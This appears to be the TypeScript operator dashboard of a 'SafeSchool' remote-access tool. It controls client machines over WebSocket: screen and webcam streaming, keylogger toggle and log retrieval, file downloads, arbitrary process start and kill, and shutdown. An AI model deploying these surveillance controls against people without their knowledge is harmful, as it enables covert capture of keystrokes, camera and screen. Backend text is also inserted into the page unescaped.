// @ts-ignore
import JMuxer from "jmuxer";
import { GatewayWsClient } from "./ws/client";

// --- State ---
interface Client {
    id: number;
    status: "online" | "offline";
    lastSeen: number;
    name?: string;
}

interface Process {
    pid: string;
    name: string;
    user: string;
    cmd: string;
}

interface AppInfo {
    id: string;
    name: string;
    icon: string;
    exec: string;
    keywords?: string; // Optional but good to have
}

let clients: Map<number, Client> = new Map();
let activeClientId: number | null = null;
let wsClient: GatewayWsClient;

// Streaming State
// Streaming State
let jmuxerScreen: any = null;
let jmuxerWebcam: any = null;

// Button State Management
type ButtonState = "idle" | "starting" | "active" | "stopping";
interface StreamStates {
    monitor: ButtonState;
    webcam: ButtonState;
    keylogger: ButtonState;
}
let streamStates: StreamStates = {
    monitor: "idle",
    webcam: "idle",
    keylogger: "idle"
};

// Process Manager State
let currentProcesses: Process[] = [];
let currentAppList: AppInfo[] = []; // Moved here
let processSearchTerm: string = "";
let processAutoRefreshInterval: any = null;

// --- DOM Elements ---
const elClientList = document.getElementById("client-list")!;
// const elMainContent = document.getElementById("main-content")!;
const elViewHome = document.getElementById("view-home")!;
const elViewClient = document.getElementById("view-client")!;
const elHeaderClientName = document.getElementById("header-client-name")!;

const statusConnection = document.getElementById("status-connection")!;
// const statusLatency = document.getElementById("status-latency")!;

// Client Controls
const btnStreamScreen = document.getElementById("btn-stream-screen") as HTMLButtonElement;
const btnStreamWebcam = document.getElementById("btn-stream-webcam") as HTMLButtonElement;
const btnKeylogToggle = document.getElementById("btn-keylog-toggle") as HTMLButtonElement;
const btnFullscreenScreen = document.getElementById("btn-fullscreen-screen")!;

const btnKill = document.getElementById("btn-kill")!;
const btnShutdown = document.getElementById("btn-shutdown")!;
const btnRestart = document.getElementById("btn-restart")!;
const inpSearchProc = document.getElementById("inp-search-proc") as HTMLInputElement;
const btnClearSearch = document.getElementById("btn-clear-search")!; // New button
const elProcessListBody = document.getElementById("process-list-body")!;
const chkSelectAll = document.getElementById("chk-select-all-procs") as HTMLInputElement;

// --- Config ---
const WS_URL = "ws://192.168.1.69:8080"; // Ubuntu VM IP (Bridge Mode)

// --- Initialization ---
console.log("🚀 SafeSchool Dashboard Initializing...");

initJMuxers();
initWebSocket();
initEvents();

// --- WebSocket ---
function initWebSocket() {
    wsClient = new GatewayWsClient({
        onLog: (msg) => console.log("[WS]", msg),
        onStatus: (s) => {
            statusConnection.textContent = `● ${s}`;
            statusConnection.style.color = s === "CONNECTED" ? "var(--neon-green)" : "var(--destructive)";
        },
        onClientId: (id) => {
            console.log("🆔 My Client ID:", id);
            discoverBackends();
        },
        onGatewayText: (text) => console.log("📢 Gateway:", text),
        onBackendActive: (id) => {
            addOrUpdateClient(id, "online");
        },
        onBackendFrame: (ev) => {
            addOrUpdateClient(ev.backendId, "online");

            // Handle Video & Binary (Multiplexed)
            if (ev.kind === "binary" && activeClientId === ev.backendId) {
                if (!ev.payload || ev.payload.byteLength === 0) return;

                const view = new DataView(ev.payload);
                const type = view.getUint8(0);

                // STRICT CHECK: Drop frames if mode doesn't match
                if (type === 0x01) { // Screen
                    if (jmuxerScreen && streamStates.monitor !== "idle") {
                       jmuxerScreen.feed({ video: new Uint8Array(ev.payload.slice(1)) });
                    }
                } else if (type === 0x02) { // Webcam
                    if (jmuxerWebcam && streamStates.webcam !== "idle") {
                       jmuxerWebcam.feed({ video: new Uint8Array(ev.payload.slice(1)) });
                    }
                } else if (type === 0x03) {
                    // File Download: [0x03][4B len][Name][Bytes]
                    const nameLen = view.getUint32(1, false); // Big Endian
                    const nameBytes = new Uint8Array(ev.payload.slice(5, 5 + nameLen));
                    const fileName = new TextDecoder().decode(nameBytes);
                    const fileData = new Uint8Array(ev.payload.slice(5 + nameLen));

                    const blob = new Blob([fileData], { type: "application/octet-stream" });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement("a");
                    a.href = url;
                    a.download = fileName;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    console.log("📥 Downloaded:", fileName);
                }
            } else if (ev.kind === "jpeg" && activeClientId === ev.backendId) {
                // Fallback for MJPEG if needed
                console.warn("Received JPEG, but expecting H.264");
            }

            // Handle Text Responses
            if (ev.kind === "text") {
                handleBackendText(ev.backendId, ev.text);
            }
        },
        onClose: () => {
            setTimeout(() => wsClient.connect(WS_URL), 2000);
        }
    });

    wsClient.connect(WS_URL);
}

function initJMuxers() {
    jmuxerScreen = new JMuxer({
        node: 'monitor-video',
        mode: 'video',
        flushingTime: 0,
        fps: 30,
        debug: true
    });

    jmuxerWebcam = new JMuxer({
        node: 'webcam-video',
        mode: 'video',
        flushingTime: 0,
        fps: 15,
        debug: true
    });
}

function discoverBackends() {
    if (wsClient.isConnected()) wsClient.sendText(0, "ping");
    setTimeout(discoverBackends, 5000); // Ping loop
}

// --- Logic ---

function addOrUpdateClient(id: number, status: "online" | "offline") {
    let c = clients.get(id);
    if (!c) {
        c = { id, status, lastSeen: Date.now() };
        clients.set(id, c);
        renderClientList();
    } else {
        c.status = status;
        c.lastSeen = Date.now();
    }
    return c;
}

function renderClientList() {
    elClientList.innerHTML = "";
    if (clients.size === 0) {
        elClientList.innerHTML = `<div class="p-4 text-muted text-sm">Scanning...</div>`;
        return;
    }

    clients.forEach((c) => {
        const div = document.createElement("div");
        div.className = `client-item ${c.id === activeClientId ? "active" : ""}`;
        div.innerHTML = `
            <div class="flex items-center gap-2">
                <div class="status-indicator ${c.status}"></div>
                <span class="font-mono font-bold">${c.name ? c.name : `Client #${c.id}`}</span>
            </div>
            <span class="text-xs text-muted">ID: ${c.id}</span>
        `;
        div.onclick = () => setActiveClient(c.id);
        elClientList.appendChild(div);
    });
}

function setActiveClient(id: number | null) {
    activeClientId = id;
    renderClientList(); // Update active class

    // Clear old interval
    if (processAutoRefreshInterval) clearInterval(processAutoRefreshInterval);

    if (!id) {
        elViewHome.style.display = "flex";
        elViewClient.style.display = "none";
        elHeaderClientName.textContent = "Overview";
        return;
    }

    const c = clients.get(id);
    elHeaderClientName.textContent = c?.name || `Client #${id}`;
    elViewHome.style.display = "none";
    elViewClient.style.display = "grid";

    // Stop previous streams
    stopActiveStreams();

    // Start Auto-Refresh (5s)
    refreshProcessList(); // Initial fetch
    processAutoRefreshInterval = setInterval(() => refreshProcessList(), 5000);
}

function stopActiveStreams() {
    if (activeClientId) {
        if (streamStates.monitor === "active" || streamStates.monitor === "starting") {
             wsClient.sendText(activeClientId, "stop_monitor_stream");
        }
        if (streamStates.webcam === "active" || streamStates.webcam === "starting") {
             wsClient.sendText(activeClientId, "stop_webcam_stream");
        }
    }

    // Force clear buffered frames by mode
    if (jmuxerScreen) {
         jmuxerScreen.reset();
         jmuxerScreen.feed({ video: new Uint8Array(0) });
    }
    if (jmuxerWebcam) {
         jmuxerWebcam.reset();
         jmuxerWebcam.feed({ video: new Uint8Array(0) });
    }

    // Reset UI
    streamStates.monitor = "idle";
    streamStates.webcam = "idle";

    btnStreamScreen.textContent = "Start Stream";
    btnStreamScreen.classList.remove("btn-destructive");
    btnStreamWebcam.textContent = "Start Cam";
    btnStreamWebcam.classList.remove("btn-destructive");
}

function handleBackendText(id: number, text: string) {
    // === STATE SYNC PROTOCOL ===
    if (text.startsWith("STATUS:SYNC:")) {
        const syncPart = text.substring(12); // Remove "STATUS:SYNC:"
        const [feature, state] = syncPart.split("=");
        const isActive = state === "active";

        console.log(`🔄 State sync: ${feature} = ${isActive ? "ACTIVE" : "INACTIVE"}`);

        switch (feature) {
            case "monitor":
                if (isActive) {
                    streamStates.monitor = "active";
                    btnStreamScreen.textContent = "Stop Stream";
                    btnStreamScreen.classList.add("btn-destructive");
                    btnStreamScreen.classList.remove("btn-primary");

                    // Initialize JMuxer if not already active
                    if (!jmuxerScreen) {
                        jmuxerScreen = new JMuxer({
                            node: "monitor-video",
                            mode: "video",
                            flushingTime: 0,
                            fps: 30,
                            debug: false,
                        });
                    }
                } else {
                    streamStates.monitor = "idle";
                    btnStreamScreen.textContent = "Start Stream";
                    btnStreamScreen.classList.remove("btn-destructive");
                    btnStreamScreen.classList.add("btn-primary");
                }
                break;

            case "webcam":
                if (isActive) {
                    streamStates.webcam = "active";
                    btnStreamWebcam.textContent = "Stop Cam";
                    btnStreamWebcam.classList.add("btn-destructive");
                    btnStreamWebcam.classList.remove("btn-success");

                    // Initialize JMuxer if not already active
                    if (!jmuxerWebcam) {
                        jmuxerWebcam = new JMuxer({
                            node: "webcam-video",
                            mode: "video",
                            flushingTime: 0,
                            fps: 30,
                            debug: false,
                        });
                    }
                } else {
                    streamStates.webcam = "idle";
                    btnStreamWebcam.textContent = "Start Cam";
                    btnStreamWebcam.classList.remove("btn-destructive");
                    btnStreamWebcam.classList.add("btn-success");
                }
                break;

            case "keylogger":
                if (isActive) {
                    streamStates.keylogger = "active";
                    btnKeylogToggle.textContent = "Disable Keylogger";
                    btnKeylogToggle.classList.add("btn-danger");
                    btnKeylogToggle.classList.remove("btn-warning");
                    btnKeylogToggle.disabled = false;
                } else {
                    streamStates.keylogger = "idle";
                    btnKeylogToggle.textContent = "Enable Keylogger";
                    btnKeylogToggle.classList.remove("btn-danger");
                    btnKeylogToggle.classList.add("btn-warning");
                    btnKeylogToggle.disabled = false;
                }
                break;

            case "complete":
                console.log("✅ State sync complete!");
                break;
        }
        return;
    }

    // === STATUS MESSAGE PROTOCOL ===
    if (text.startsWith("STATUS:")) {
        const [_, feature, state] = text.split(":");

        if (feature === "MONITOR_STREAM") {
            if (state === "STARTING") {
                streamStates.monitor = "starting";
                // UI already updated by button click
            } else if (state === "STARTED") {
                streamStates.monitor = "active";
                btnStreamScreen.textContent = "Stop Stream";
                btnStreamScreen.classList.add("btn-destructive");
                btnStreamScreen.disabled = false;
            } else if (state === "STOPPED") {
                streamStates.monitor = "idle";
                btnStreamScreen.textContent = "Start Stream";
                btnStreamScreen.classList.remove("btn-destructive");
                btnStreamScreen.disabled = false;
            }
        } else if (feature === "WEBCAM_STREAM") {
            if (state === "STARTING") {
                streamStates.webcam = "starting";
            } else if (state === "STARTED") {
                streamStates.webcam = "active";
                btnStreamWebcam.textContent = "Stop Cam";
                btnStreamWebcam.classList.add("btn-destructive");
                btnStreamWebcam.disabled = false;
            } else if (state === "STOPPED") {
                streamStates.webcam = "idle";
                btnStreamWebcam.textContent = "Start Cam";
                btnStreamWebcam.classList.remove("btn-destructive");
                btnStreamWebcam.disabled = false;
            }
        } else if (feature === "KEYLOGGER") {
            const btnKeylogToggle = document.getElementById("btn-keylog-toggle") as HTMLButtonElement;
            const btnKeylogDownload = document.getElementById("btn-keylog-download") as HTMLButtonElement;
            const elKeylogStatus = document.getElementById("keylog-status")!;

            if (state === "STARTING") {
                streamStates.keylogger = "starting";
            } else if (state === "STARTED") {
                streamStates.keylogger = "active";
                btnKeylogToggle.textContent = "Disable Keylogger";
                btnKeylogToggle.classList.add("btn-destructive");
                btnKeylogToggle.disabled = false;
                btnKeylogDownload.disabled = false;
                elKeylogStatus.textContent = "Recording...";
                elKeylogStatus.style.color = "var(--neon-green)";
            } else if (state === "STOPPED") {
                streamStates.keylogger = "idle";
                btnKeylogToggle.textContent = "Enable Keylogger";
                btnKeylogToggle.classList.remove("btn-destructive");
                btnKeylogToggle.disabled = false;
                elKeylogStatus.textContent = "Stopped";
                elKeylogStatus.style.color = "var(--muted)";
            }
        }
        return; // Don't process as normal text
    }

    // === ERROR MESSAGE PROTOCOL ===
    if (text.startsWith("ERROR:")) {
        const [_, feature, reason] = text.split(":");
        const friendlyReason = reason.replace(/_/g, " ").toLowerCase();
        alert(`❌ ${feature.replace(/_/g, " ")}: ${friendlyReason}`);

        // Reset button states on error
        if (feature === "MONITOR_STREAM") {
            streamStates.monitor = "idle";
            btnStreamScreen.textContent = "Start Stream";
            btnStreamScreen.disabled = false;
        } else if (feature === "WEBCAM_STREAM") {
            streamStates.webcam = "idle";
            btnStreamWebcam.textContent = "Start Cam";
            btnStreamWebcam.disabled = false;
        }
        return; // Don't process as normal text
    }

    // === EXISTING MESSAGE HANDLERS ===
    if (id !== activeClientId) return;

    // Keylogger Data
    if (text.startsWith("KEYLOG: ")) {
        const char = text.substring(8);
        const feed = document.getElementById("keylog-feed");
        if (feed) {
            feed.innerText += char;
            feed.scrollTop = feed.scrollHeight;
        }
    }
    // Process List response
    else if (text.startsWith("DATA:APPS:")) {
         const payload = text.substring(10);
         // Handle empty list
         if(!payload) { renderApplications([]); return; }

         const apps: AppInfo[] = payload.split(';').map(item => {
             const parts = item.split('|');
             return {
                 id: parts[0],
                 name: parts[1],
                 icon: parts[2] || "",
                 exec: parts[3] || "",
                 keywords: parts[4] || ""
             };
         });
         renderApplications(apps);
    }
    // Process List response
    else if (text.includes("PID") && text.includes("NAME")) { // Header check
        console.log("✅ Received Process List response");
        parseProcessList(text);
    }
    // Command feedback
    else if (text.startsWith("OK:")) {
        console.log("Success:", text);
        const msg = text.substring(4);
        alert("✅ Success: " + msg);
        const status = document.getElementById("status-message");
        if(status) status.textContent = "Last Action: " + msg;
    }
    else if (text.startsWith("INFO: NAME=")) {
        const name = text.substring(11).trim();
        const c = clients.get(id);
        if (c) {
            c.name = name;
            renderClientList();
            if (activeClientId === id) elHeaderClientName.textContent = name;
        }
    }
    else if (text.startsWith("ERROR:")) {
        alert("❌ " + text);
    }
}

// --- Process Manager Logic ---

function refreshProcessList() {
    if (activeClientId) wsClient.sendText(activeClientId, "list_process");
}

function parseProcessList(raw: string) {
    const lines = raw.split("\n").slice(1);
    currentProcesses = [];

    lines.forEach(line => {
        if (!line.trim()) return;
        const parts = line.trim().split(/\s+/);
        // Format: PID NAME USER CMD
        const pid = parts[0];
        const name = parts[1];
        const user = parts[2];
        const cmd = parts.slice(3).join(" ");

        currentProcesses.push({ pid, name, user, cmd });
    });

    renderProcessList();
}

function renderProcessList() {
    elProcessListBody.innerHTML = "";

    // Filter
    const filtered = currentProcesses.filter(p => {
        if (!processSearchTerm) return true;
        const term = processSearchTerm.toLowerCase();
        return p.name.toLowerCase().includes(term) ||
               p.pid.includes(term) ||
               p.cmd.toLowerCase().includes(term);
    });

    const fragment = document.createDocumentFragment();

    filtered.forEach(p => {
        const displayCmd = p.cmd || p.name;
        const tr = document.createElement("tr");
        tr.innerHTML = `
            <td><input type="checkbox" class="chk-proc-row" data-pid="${p.pid}"></td>
            <td>${p.pid}</td>
            <td class="text-primary truncate" style="max-width: 200px;" title="${displayCmd}">${p.name}</td>
            <td>${p.user}</td>
            <td><button class="btn btn-sm btn-destructive btn-kill-proc" data-pid="${p.pid}">Kill</button></td>
        `;
        fragment.appendChild(tr);
    });

    elProcessListBody.appendChild(fragment);

    // Sync App Status Overlay
    if(currentAppList && currentAppList.length > 0) {
        renderApplications(currentAppList);
    }
}

// Debounce Utility
function debounce(func: Function, wait: number) {
    let timeout: any;
    return function (...args: any) {
        clearTimeout(timeout);
        timeout = setTimeout(() => func(...args), wait);
    };
}

function initEvents() {
    // Theme Toggle
    const btnThemeToggle = document.getElementById("btn-theme-toggle")!;

    // Init Theme
    const savedTheme = localStorage.getItem("theme") || "dark";
    document.documentElement.setAttribute("data-theme", savedTheme);
    btnThemeToggle.textContent = savedTheme === "dark" ? "🌙" : "☀️";

    btnThemeToggle.onclick = () => {
        const current = document.documentElement.getAttribute("data-theme");
        const next = current === "light" ? "dark" : "light";
        document.documentElement.setAttribute("data-theme", next);
        localStorage.setItem("theme", next);
        btnThemeToggle.textContent = next === "dark" ? "🌙" : "☀️";
    };

    // Auto-ping removed from manual button, but discoverBackends loop still runs.

    // Recording Buttons
    const btnRecordScreen = document.getElementById("btn-record-screen")!;
    const btnRecordWebcam = document.getElementById("btn-record-webcam")!;

    btnRecordScreen.onclick = () => {
        if(activeClientId) {
            wsClient.sendText(activeClientId, "record_screen_10s");
            btnRecordScreen.textContent = "Recording...";
            btnRecordScreen.setAttribute("disabled", "true");
            setTimeout(() => {
                btnRecordScreen.textContent = "Rec (10s)";
                btnRecordScreen.removeAttribute("disabled");
            }, 10000);
        }
    };

    btnRecordWebcam.onclick = () => {
        if(activeClientId) {
            wsClient.sendText(activeClientId, "record_webcam_10s");
            btnRecordWebcam.textContent = "Recording...";
            btnRecordWebcam.setAttribute("disabled", "true");
            setTimeout(() => {
                btnRecordWebcam.textContent = "Rec (10s)";
                btnRecordWebcam.removeAttribute("disabled");
            }, 10000);
        }
    };

    // Fullscreen
    btnFullscreenScreen.onclick = () => {
        const el = document.getElementById("monitor-video");
        if (el && el.requestFullscreen) el.requestFullscreen();
    };

    // Stream Buttons - STATE MACHINE BASED
    btnStreamScreen.onclick = () => {
        if (!activeClientId) return;

        if (streamStates.monitor === "idle") {
            // Start stream
            streamStates.monitor = "starting";
            btnStreamScreen.textContent = "Starting...";
            btnStreamScreen.disabled = true;
            wsClient.sendText(activeClientId, "start_monitor_stream");
        } else if (streamStates.monitor === "active") {
            // Stop stream
            streamStates.monitor = "stopping";
            btnStreamScreen.textContent = "Stopping...";
            btnStreamScreen.disabled = true;
            wsClient.sendText(activeClientId, "stop_monitor_stream");
        }
        // Ignore clicks in "starting" or "stopping" states
    };

    btnStreamWebcam.onclick = () => {
        if (!activeClientId) return;

        if (streamStates.webcam === "idle") {
            // Start webcam
            streamStates.webcam = "starting";
            btnStreamWebcam.textContent = "Starting...";
            btnStreamWebcam.disabled = true;
            wsClient.sendText(activeClientId, "start_webcam_stream");
        } else if (streamStates.webcam === "active") {
            // Stop webcam
            streamStates.webcam = "stopping";
            btnStreamWebcam.textContent = "Stopping...";
            btnStreamWebcam.disabled = true;
            wsClient.sendText(activeClientId, "stop_webcam_stream");
        }
        // Ignore clicks in "starting" or "stopping" states
    };

    // Keylogger - STATE MACHINE BASED
    const btnKeylogToggle = document.getElementById("btn-keylog-toggle") as HTMLButtonElement;
    const btnKeylogDownload = document.getElementById("btn-keylog-download") as HTMLButtonElement;

    // Download handler
    btnKeylogDownload.onclick = () => {
        if (!activeClientId) return;
        wsClient.sendText(activeClientId, "get_keylog");
    };

    // Toggle handler with state machine
    btnKeylogToggle.onclick = () => {
        if (!activeClientId) return;

        if (streamStates.keylogger === "idle") {
            // Start keylogger
            streamStates.keylogger = "starting";
            btnKeylogToggle.textContent = "Enabling...";
            btnKeylogToggle.disabled = true;
            wsClient.sendText(activeClientId, "start_keylog");
        } else if (streamStates.keylogger === "active") {
            // Stop keylogger
            streamStates.keylogger = "stopping";
            btnKeylogToggle.textContent = "Disabling...";
            btnKeylogToggle.disabled = true;
            wsClient.sendText(activeClientId, "stop_keylog");
        }
        // Ignore clicks in "starting" or "stopping" states
    };

    // Webcam Fullscreen
    const btnFullscreenWebcam = document.getElementById("btn-fullscreen-webcam")!;
    btnFullscreenWebcam.onclick = () => {
        const el = document.getElementById("webcam-video");
        if (el && el.requestFullscreen) el.requestFullscreen();
    };

    // --- Search & Process ---

    const handleSearch = debounce(() => {
        processSearchTerm = inpSearchProc.value.toLowerCase().trim();
        renderProcessList();

        // Toggle Clear Button
        if (processSearchTerm) {
            btnClearSearch.style.display = "block";
            inpSearchProc.style.border = "1px solid var(--neon-cyan)";
            inpSearchProc.style.boxShadow = "0 0 5px var(--neon-cyan)";
        } else {
            btnClearSearch.style.display = "none";
            inpSearchProc.style.border = "";
            inpSearchProc.style.boxShadow = "";
        }
    }, 300);

    inpSearchProc.addEventListener("input", handleSearch);

    // Clear Button Logic
    btnClearSearch.onclick = () => {
        inpSearchProc.value = "";
        processSearchTerm = "";
        renderProcessList();
        btnClearSearch.style.display = "none";
        inpSearchProc.style.border = "";
        inpSearchProc.style.boxShadow = "";
        inpSearchProc.focus();
    };

    // Select All
    chkSelectAll.onchange = () => {
        const checkboxes = document.querySelectorAll(".chk-proc-row") as NodeListOf<HTMLInputElement>;
        checkboxes.forEach(kb => {
            // Only select visible rows
            if (kb.closest("tr")?.isConnected) {
                kb.checked = chkSelectAll.checked;
            }
        });
    };

    // Multi-Kill
    btnKill.onclick = () => {
        if (!activeClientId) return;
        const checked = document.querySelectorAll(".chk-proc-row:checked");
        if (checked.length === 0) return alert("No processes selected!");

        if (confirm(`Kill ${checked.length} selected processes?`)) {
            checked.forEach((kb: any) => {
                const pid = kb.getAttribute("data-pid");
                if (pid) wsClient.sendText(activeClientId!, `kill_process ${pid}`);
            });
            setTimeout(() => refreshProcessList(), 1000);
        }
    };

    // Process List Delegation (Kill Button)
    elProcessListBody.addEventListener("click", (e) => {
        const target = e.target as HTMLElement;
        const btn = target.closest(".btn-kill-proc");

        if (btn) {
            const pid = btn.getAttribute("data-pid");
            if (pid && activeClientId) {
                if (confirm(`Are you sure you want to KILL process ${pid}?`)) {
                    wsClient.sendText(activeClientId, `kill_process ${pid}`);
                    setTimeout(() => refreshProcessList(), 500);
                }
            }
        }
    });

    // Client Shutdown
    btnShutdown.onclick = () => {
        if (activeClientId && confirm(`Are you sure you want to SHUTDOWN Client #${activeClientId}?`)) {
            wsClient.sendText(activeClientId, "shutdown");
        }
    };

    // Client Restart
    btnRestart.onclick = () => {
        if (activeClientId && confirm(`Are you sure you want to RESTART Client #${activeClientId}?`)) {
            wsClient.sendText(activeClientId, "restart");
        }
    };

    // --- New Process & App Features ---
    const inpStartProc = document.getElementById("inp-start-proc") as HTMLInputElement;
    const btnStartProcExec = document.getElementById("btn-start-proc-exec")!;
    const inpSearchApps = document.getElementById("inp-search-apps") as HTMLInputElement; // NEW

    // ... (btnStartProcExec logic) ...

    btnStartProcExec.onclick = () => {
        const cmd = inpStartProc.value.trim();
        if(cmd && activeClientId) {
            wsClient.sendText(activeClientId, `start_process ${cmd}`);
            inpStartProc.value = "";
        }
    };

    // Search Apps Logic
    let searchTimeout: any = null;
    inpSearchApps.addEventListener("input", () => {
        clearTimeout(searchTimeout);
        const query = inpSearchApps.value.trim();
        searchTimeout = setTimeout(() => {
             if(activeClientId) {
                 if(query) wsClient.sendText(activeClientId!, `search_apps ${query}`);
                 else wsClient.sendText(activeClientId!, "list_apps");
             }
        }, 300);
    });

    // Auto-Refresh Apps Loop (every 5 seconds)
    setInterval(() => {
        if(activeClientId) {
             const query = inpSearchApps.value.trim();
             if(query) wsClient.sendText(activeClientId, `search_apps ${query}`);
             else wsClient.sendText(activeClientId, "list_apps");
        }
    }, 5000);

    // Bulk App Actions
    const chkSelectAllApps = document.getElementById("chk-select-all-apps") as HTMLInputElement;
    const btnLaunchSelected = document.getElementById("btn-launch-selected")!;
    const btnKillSelected = document.getElementById("btn-kill-selected")!;

    if(chkSelectAllApps) {
        chkSelectAllApps.onchange = () => {
            const checkboxes = document.querySelectorAll(".chk-app-row") as NodeListOf<HTMLInputElement>;
            checkboxes.forEach(kb => {
                if (kb.closest("tr")?.isConnected) kb.checked = chkSelectAllApps.checked;
            });
        };
    }

    if(btnLaunchSelected) {
        btnLaunchSelected.onclick = () => {
            if(!activeClientId) return;
            const checked = document.querySelectorAll(".chk-app-row:checked");
            if(checked.length === 0) return alert("No applications selected");

            let count = 0;
            checked.forEach((cb: any) => {
                const appId = cb.getAttribute("data-id");
                const app = currentAppList.find(a => a.id === appId);
                // Smart Launch: Only if STOPPED
                if(app && getAppPids(app).length === 0) {
                    wsClient.sendText(activeClientId!, `start_app ${app.id}`);
                    count++;
                }
            });

            if(count === 0 && checked.length > 0) alert("All selected apps are already running.");
        };
    }

    if(btnKillSelected) {
        btnKillSelected.onclick = () => {
            if(!activeClientId) return;
            const checked = document.querySelectorAll(".chk-app-row:checked");
            if(checked.length === 0) return alert("No applications selected");

            let count = 0;
            checked.forEach((cb: any) => {
                const appId = cb.getAttribute("data-id");
                const app = currentAppList.find(a => a.id === appId);
                // Smart Kill: Only if RUNNING
                if(app) {
                    const pids = getAppPids(app);
                    if(pids.length > 0) {
                        pids.forEach(pid => wsClient.sendText(activeClientId!, `kill_process ${pid}`));
                        count++;
                    }
                }
            });

             if(count === 0 && checked.length > 0) alert("None of the selected apps are running.");
        };
    }
}

// Store latest apps for re-rendering when process list updates
// (currentAppList declared at top)

// Helper to check if app is running
function getAppPids(app: AppInfo): string[] {
    // extract binary name from start cmd
    let binName = app.exec.split(' ')[0].split('/').pop()?.toLowerCase();
    if (!binName) return [];

    return currentProcesses
        .filter(p => {
             const pName = p.name.toLowerCase();
             const pCmd = p.cmd.toLowerCase();
             // Match either exact name or substring in cmd
             return pName === binName || pCmd.includes(binName!);
        })
        .map(p => p.pid);
}

function renderApplications(apps: AppInfo[]) {
    currentAppList = apps; // Cache it
    const tbody = document.getElementById("app-list-body");
    if(!tbody) return;
    tbody.innerHTML = "";

    if (apps.length === 0) {
        tbody.innerHTML = "<tr><td colspan='4' class='text-center text-muted p-4'>No applications found.</td></tr>";
        return;
    }

    apps.forEach(app => {
        const tr = document.createElement("tr");
        tr.className = "proc-row"; // Reuse process row styling for hover

        // State Check
        const pids = getAppPids(app);
        const isRunning = pids.length > 0;

        // Checkbox
        const tdCheck = document.createElement("td");
        tdCheck.innerHTML = `<input type="checkbox" class="chk-app-row" data-id="${app.id}">`;

        // App Info
        const tdName = document.createElement("td");
        tdName.innerHTML = `
            <div class="flex items-center gap-3">
                <div class="text-xl">🚀</div>
                <div>
                    <div class="font-bold text-white">${app.name}</div>
                    <div class="text-xs text-muted" style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">${app.exec}</div>
                </div>
            </div>
        `;

        // Status
        const tdStatus = document.createElement("td");
        if (isRunning) {
            tdStatus.innerHTML = `<span class="badge badge-success display-inline-flex align-center gap-1">● Running <span class="text-xs opacity-50">(${pids.length})</span></span>`;
        } else {
            tdStatus.innerHTML = `<span class="badge badge-neutral">Stopped</span>`;
        }

        // Actions
        const tdAction = document.createElement("td");
        tdAction.style.textAlign = "right";

        if (isRunning) {
            // Kill Button
            const btnKill = document.createElement("button");
            btnKill.className = "btn btn-xs btn-destructive";
            btnKill.innerHTML = "💀 Kill";
            btnKill.onclick = (e) => {
                e.stopPropagation();
                if(confirm(`Kill ${app.name} (${pids.length} process instances)?`)) {
                    pids.forEach(pid => wsClient.sendText(activeClientId!, `kill_process ${pid}`));
                    // Optimistic update? No, let auto-refresh handle it
                }
            };
            tdAction.appendChild(btnKill);
        } else {
             // Launch Button
            const btnLaunch = document.createElement("button");
            btnLaunch.className = "btn btn-xs";
            btnLaunch.style.backgroundColor = "var(--neon-cyan)";
            btnLaunch.style.color = "black";
            btnLaunch.innerHTML = "🚀 Launch";
            btnLaunch.onclick = (e) => {
                 e.stopPropagation();
                 wsClient.sendText(activeClientId!, `start_app ${app.id}`);
            };
            tdAction.appendChild(btnLaunch);
        }

        tr.append(tdCheck, tdName, tdStatus, tdAction);
        tbody.appendChild(tr);
    });
}
